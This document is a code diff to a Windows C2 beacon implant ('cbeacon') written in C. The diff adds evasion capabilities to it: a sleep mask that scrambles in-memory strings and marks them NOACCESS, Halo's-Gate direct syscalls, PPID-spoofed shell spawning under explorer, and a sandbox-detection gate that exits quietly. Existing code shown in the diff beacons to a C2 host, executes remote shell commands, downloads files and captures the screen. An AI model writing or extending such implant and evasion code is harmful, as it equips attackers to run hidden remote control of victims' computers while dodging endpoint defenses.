@@ -23,7 +23,9 @@
  *     -lwinhttp -lbcrypt -D C2_HOST="..." -D C2_PORT=... ^
  *     -D SECRET_ID="..." -D SECRET_B64="..."
  *
- * This is a PROTOTYPE: HTTP only, no evasion.
+ * This is a PROTOTYPE: HTTP only. Evasion: XOR+NOACCESS sleep mask with
+ * Halo's-Gate NtDelayExecution, PPID-spoofed shell spawn, startup sandbox
+ * gate (see evade.c/evade.h; README states the exact capability).
  * Identity (UUID + X25519 key) persists in %TEMP%\\fc2c.dat.
  */
 #define _CRT_SECURE_NO_WARNINGS
@@ -40,6 +42,13 @@
 #include "sqlite3.h"
 #include "crypto_cng.h"
 #include "curve25519.h"
+#include "evade.h"
+
+/* Canonical UA, single-sourced so the sleep-mask shadow buffer covers it. */
+#define CBEACON_UA "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+#define WIDEN2(x) L##x
+#define WIDEN(x) WIDEN2(x)
+#define CBEACON_UA_W WIDEN(CBEACON_UA)
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "sqlite3.lib")
@@ -101,6 +110,13 @@ static const GUID GDIP_EncoderQuality = {0x1d5be4b5, 0xfa4a, 0x452d, {0x9c, 0xdd
 #ifndef SECRET_B64
 #define SECRET_B64 ""
 #endif
+
+/* Sleep-mask shadow providers (evade.c reads build-time/runtime strings).
+ * Placed after the -D defaults so every build variant resolves them. */
+const char *evade_str_c2host(void) { return C2_HOST; }
+const char *evade_str_beacon_path(void) { return BEACON_PATH; }
+const char *evade_str_secret_id(void) { return SECRET_ID; }
+const char *evade_str_ua(void) { return CBEACON_UA; }
 #ifndef INTERVAL
 #define INTERVAL 10
 #endif
@@ -280,7 +296,7 @@ static char *http_post(const char *body, DWORD bodylen, DWORD *outlen) {
     }
     resp = (char *)malloc(cap);
     if (!resp) return NULL;
-    hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+    hSess = WinHttpOpen(CBEACON_UA_W, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSess) goto done;
     hConn = WinHttpConnect(hSess, whost, (INTERNET_PORT)C2_PORT, 0);
@@ -447,11 +463,15 @@ static int verify_resp_mac(unsigned long long seq, const char *server_pub_b64,
 /* ---------- tasks ---------- */
 
 static char *exec_shell(const char *cmd, DWORD *outlen) {
-    /* _popen runs through cmd.exe /c by default on Windows. */
+    /* PPID-spoofed spawn first (explorer parent); falls back to _popen
+     * inside exec_shell_spoofed on any failure. Same output contract. */
+    char *spoofed = exec_shell_spoofed(cmd, outlen, OUT_CAP);
     FILE *fp;
     char *buf;
     size_t cap = 65536, len = 0, n;
     char chunk[8192];
+    if (spoofed) return spoofed;
+    /* _popen runs through cmd.exe /c by default on Windows. */
     buf = (char *)malloc(cap);
     if (!buf) return NULL;
     fp = _popen(cmd, "r");
@@ -1668,7 +1688,7 @@ static int download_url_to_file(const char *url, const char *dest,
         if (err) strcpy_s(err, errcap, "only http(s) supported");
         return -1;
     }
-    hs = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+    hs = WinHttpOpen(CBEACON_UA_W, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hs) goto done;
     hc = WinHttpConnect(hs, whost, uc.nPort, 0);
@@ -1844,7 +1864,8 @@ static void do_sleep_interval(void) {
         }
     }
     if (base_ms < 1000) base_ms = 1000;
-    Sleep((DWORD)base_ms);
+    /* Masked sleep: shadow buffer scrambled + NOACCESS, direct syscall. */
+    sleepmask_sleep((DWORD)base_ms);
 }
 
 /* ---------- screen capture (gh0st C_SCREEN parity, stills + polled stream) ---
@@ -2833,6 +2854,11 @@ int main(void) {
         fprintf(stderr, "[cbeacon] build with -DSECRET_ID=... -DSECRET_B64=...\n");
         return 1;
     }
+    /* Startup sandbox gate (P1-6A): tick-acceleration + hw checks. Quiet
+     * exit on detection; build with -DSANDBOX_CHECKS=0 to strip for labs. */
+    if (evade_sandbox_check() != 0) {
+        return 0;
+    }
     secret = b64dec(SECRET_B64, &seclen);
     if (!secret || seclen != 32) {
         fprintf(stderr, "[cbeacon] bad SECRET_B64\n");
@@ -2864,6 +2890,12 @@ int main(void) {
         memcpy(g_idpub_for_reg, idpub, 32);
         cng_wipe(idpriv, 32);
     }
+    /* Arm the sleep mask now that the UUID is final (shadow covers C2
+     * host/path, secret id, UA and UUID). Best-effort: beaconing works
+     * unmasked if init fails. */
+    if (!sleepmask_init(g_uuid)) {
+        fprintf(stderr, "[cbeacon] warning: sleep mask unavailable\n");
+    }
     printf("[cbeacon] uuid=%s c2=%s:%d%s\n", g_uuid, C2_HOST, C2_PORT, BEACON_PATH);
 
     for (;;) {
@@ -2882,7 +2914,7 @@ int main(void) {
             if (!info || !inner) {
                 if (info) free(info);
                 if (inner) free(inner);
-                Sleep(5000);
+                sleepmask_sleep(5000);
                 continue;
             }
             _snprintf(inner, icap,
@@ -2894,7 +2926,7 @@ int main(void) {
             frame = build_encrypted(inner, &frameseq);
             free(inner);
         }
-        if (!frame) { Sleep(5000); continue; }
+        if (!frame) { sleepmask_sleep(5000); continue; }
         resp = http_post(frame, (DWORD)strlen(frame), &resplen);
         free(frame);
         dbglog("post-ret", "", 0);
@@ -2923,7 +2955,7 @@ int main(void) {
                 /* Server lost our row but holds our secret: re-enroll. */
                 g_mode_register = 1;
                 free(resp);
-                Sleep(2000);
+                sleepmask_sleep(2000);
                 continue;
             }
             if (!jstring(resp, "ecdh_pub", spub, sizeof(spub)) ||
@@ -2935,7 +2967,7 @@ int main(void) {
                  * means "unknown row" -> try a fresh register. */
                 g_mode_register = g_mode_register ? 0 : 1;
                 free(resp);
-                Sleep(5000);
+                sleepmask_sleep(5000);
                 continue;
             }
             {
